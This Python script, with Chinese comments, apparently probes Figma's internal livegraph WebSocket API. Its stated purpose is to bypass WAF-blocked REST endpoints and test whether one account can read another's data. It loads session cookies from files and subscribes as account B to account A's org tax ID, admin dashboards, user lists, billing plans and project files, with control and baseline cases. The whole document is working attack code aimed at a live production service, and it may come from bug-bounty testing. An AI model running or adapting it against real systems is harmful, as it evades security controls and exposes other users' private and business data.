# -*- coding: utf-8 -*-
"""WS 通道绕过 REST 403: 订阅 PURE resolver view 越权矩阵
REST /api/internal/livegraph/sinatra_resolver/* 被 WAF+代理双封(403/rejected)
但前端数据通过 WS 订阅 view 名走后端内部 resolver -> 绕过 REST 封禁
矩阵: B 纯净 cookie 订阅 A 的资源(org/plan/team/folder) 对照 B 自己
"""
import sys, json, io, asyncio, time, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
A_PLAN = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
B_PLAN = "46b1d26c-c802-4ef1-a83c-d96cfe7295f4"
A_FOLDER = "634606970"
B_FOLDER = "636027529"
EXT_ORG = "1484997479016537761"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    authn_raw = parts.get("__Host-figma.authn", "")
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)
ABS_A = make_abs_pure(rawA, A_UID)
print(f"B 纯净 cookie ok: {len(ABS_B)} | A 纯净 cookie ok: {len(ABS_A)}")

# (label, viewName, args)  -> B 账号订阅,参数指向 A 的资源
CASES_A = [
    ("OrgTaxIdView A",            "OrgTaxIdView",            {"orgId": EXT_ORG}),
    ("PlanAiUsageMonthly A",      "PlanAiUsageMonthly",      {"planId": A_PLAN, "sampleUserCount": 25}),
    ("AccountTypeRequestsInPlan", "AccountTypeRequestsInPlan", {"planType": "Team", "planId": A_TEAM, "firstPageSize": 25}),
    ("AdminRequestDashboardView", "AdminRequestDashboardView", {"planType": "Team", "planId": A_TEAM, "firstPageSize": 25}),
    ("AdminNotificationsCount",   "AdminNotificationsCountView", {"planType": "Team", "planId": A_TEAM}),
    ("AdminRequestDashOrgInfo",   "AdminRequestDashOrgInfo", {"orgId": EXT_ORG}),
    ("AdminRequestDashRowIds",    "AdminRequestDashboardRowIds", {"planType": "Team", "planId": A_TEAM}),
    ("OrgAdminUserView A",        "OrgAdminUserView",        {"orgId": EXT_ORG, "firstPageSize": 25, "refetchToken": ""}),
    ("OrgUsersByIdView A",        "OrgUsersByIdView",        {"orgId": EXT_ORG, "orgUserIds": [A_UID, B_UID]}),
    ("OrgTeamSummariesView A",    "OrgTeamSummariesView",    {"orgId": EXT_ORG}),
    ("ProjectFiles A folder",     "ProjectFiles",            {"projectId": A_FOLDER}),
    ("PlanByTeamId A",            "PlanByTeamId",            {"teamId": A_TEAM}),
    ("PlanByOrgId A",             "PlanByOrgId",             {"orgId": EXT_ORG}),
    ("AiCreditsPlanContext A",    "AiCreditsPlanContextView", {"planId": A_PLAN}),
]
CASES_B = [
    ("OrgTaxIdView B(对照)",      "OrgTaxIdView",            {"orgId": B_TEAM}),
    ("PlanByTeamId B(对照)",      "PlanByTeamId",            {"teamId": B_TEAM}),
    ("ProjectFiles B(对照)",      "ProjectFiles",            {"projectId": B_FOLDER}),
]

OUT = io.open("_ws_resolver_bypass_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def probe(label, cookie, uid, view, args):
    frames = []
    try:
        async with websockets.connect(lg_url(A_MAKE, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{A_MAKE}"},
                                      "clientRequestedVersion": 2}))
            au = None
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    au = json.loads(m).get("userId")
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + 9
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m:
                        break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        OUT.write(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}\n")
        return
    print(f"[{label}] authUserId={au} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} authUserId={au} 帧数={len(frames)} =====\n")
    for f in frames:
        OUT.write(f"  {f[:1200]}\n")
        if "initial" in f and "{}" not in f.replace(" ", ""):
            print(f"  🖼 {f[:600]}")
        elif "does not exist" in f or "error" in f.lower():
            print(f"  ⚠ {f[:300]}")


async def main():
    print("=" * 70)
    print("A. B 账号 -> A 资源 (越权面)")
    for label, view, args in CASES_A:
        await probe(label, ABS_B, B_UID, view, args)
    print("=" * 70)
    print("B. B 账号 -> B 自己 (对照)")
    for label, view, args in CASES_B:
        await probe(label, ABS_B, B_UID, view, args)
    print("=" * 70)
    print("C. A 账号 -> A 资源 (基线)")
    await probe("OrgTaxIdView A自己", ABS_A, A_UID, "OrgTaxIdView", {"orgId": EXT_ORG})
    OUT.close()


asyncio.run(main())
